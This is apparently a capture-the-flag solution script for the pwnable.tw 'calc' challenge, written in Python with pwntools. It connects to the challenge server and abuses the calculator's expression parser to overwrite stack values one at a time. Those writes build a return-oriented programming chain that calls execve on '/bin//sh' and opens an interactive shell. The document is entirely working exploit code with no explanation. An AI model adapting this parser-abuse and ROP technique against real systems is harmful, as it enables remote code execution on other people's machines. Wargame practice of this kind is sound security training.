from pwn import *

#p = process('./calc')
p = remote('chall.pwnable.tw', 10100)

offset = 361

payload = [0x080701aa, 0x080ec060, 0x0805c34b, int.from_bytes(b'/bin', byteorder='little', signed=False), 0x0809b30d, 0x080701aa, 0x080ec064, 0x0805c34b, int.from_bytes(b'//sh', byteorder='little', signed=False), 0x0809b30d, 0x080701aa, 0x080ec068, 0x080550d0, 0x0809b30d, 0x080481d1, 0x080ec060, 0x080701d1, 0x080ec068, 0x080ec060, 0x080701aa, 0x080ec068, 0x0805c34b, 0x0000000b, 0x08049a21]

p.recvline()

for i in range(len(payload)):
	send = '+' + str(offset + i)
	p.sendline(bytes(send, 'utf-8'))

	current = int(p.recvline().strip())

	need = payload[i] - current

	if need >= 0:
		send = '+' + str(offset + i) + '+' + str(need)
	else:
		send = '+' + str(offset + i) + str(need)
	
	p.sendline(bytes(send, 'utf-8'))
	p.recvline()

p.sendline()
p.interactive()
